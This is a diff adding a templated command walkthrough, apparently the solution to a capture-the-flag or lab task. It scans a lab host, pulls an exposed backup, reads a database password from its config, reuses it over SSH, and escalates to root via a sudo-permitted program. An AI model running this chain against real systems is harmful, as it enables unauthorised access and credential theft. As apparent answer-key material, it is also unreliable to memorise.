@@ -1,0 +1,17 @@
+## scan the server and look at its web folders
+nmap -sV 10.10.12.30
+webscan http://10.10.12.30/
+## the backup folder lists a downloadable archive
+curl -s http://10.10.12.30/backup/
+curl -s http://10.10.12.30/backup/site-backup.tar.gz -o site-backup.tar.gz
+## unpack it and read the config - it holds the database password
+tar xzf site-backup.tar.gz
+cat site/config/db.php
+## that password also works for the service account over ssh
+ssh -o StrictHostKeyChecking=accept-new {{SVCUSER}}@10.10.12.30
+{{DBPW}}
+cat flag.txt
+## one program runs as root - use it to read root's flag
+sudo -l
+{{SUDORUN}}
+exit
